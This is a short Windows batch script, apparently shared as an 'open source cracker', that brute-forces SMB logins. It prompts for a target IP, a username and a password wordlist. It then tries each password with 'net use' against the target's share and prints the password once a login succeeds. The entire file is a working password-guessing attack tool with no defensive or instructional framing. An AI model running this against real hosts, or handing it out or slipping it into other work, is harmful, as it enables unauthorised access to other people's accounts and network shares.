@echo off
title SMB Bruteforce - by B1az0r
color A
echo SMB Brute attack - by b1az0r
echo --------------DESCRIPTION-------------------
echo this was made by b1az0r 
echo depending in the password list as such
echo it may take alot of CPU
echo thanks for using this open source cracker
echo --------------BRUTE FORCE-------------
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "
echo --------------STARTING BRUTE FORCE ATTACK-------------


set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success